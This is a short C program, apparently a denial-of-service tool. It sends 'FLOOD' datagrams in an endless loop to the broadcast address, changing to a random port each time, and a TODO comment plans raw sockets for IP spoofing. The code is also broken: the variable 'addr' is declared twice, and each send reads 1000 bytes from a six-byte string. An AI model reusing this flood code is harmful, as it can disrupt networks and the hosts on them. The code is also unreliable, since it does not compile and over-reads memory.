// udp client driver program
#include <stdio.h>
#include <strings.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/random.h>

#define MAXLINE 1000
// Driver code

// TODO: implement custom signal handling for SIGTERM so it closes sock_fd

// TODO: implement rawsockets for ip spoofing

int main()
{
    char *addr = "10.0.0.1";
    char buffer[100];
    char *message = "FLOOD";
    int sockfd;
    struct sockaddr_in addr;

    bzero(&addr, sizeof(addr));
    u_int16_t random_port;
    getrandom(&random_port, sizeof(random_port), 1);
    printf("%d\n", random_port);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);
    addr.sin_port = htons(random_port);
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    int broadcast_enable = 1;
    int ret = setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &broadcast_enable, sizeof(broadcast_enable));

    if (ret < 0)
    {
        perror("setsockopt failed");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // while(1){
    // sendto(sockfd, message, MAXLINE, 0, (struct sockaddr *)&addr, sizeof(addr));
    // }
    while (1)
    {
        sendto(sockfd, message, MAXLINE, 0, (struct sockaddr *)&addr, sizeof(addr));
        getrandom(&random_port, sizeof(random_port), 1);
        addr.sin_port = htons(random_port);
    }

    close(sockfd);
}
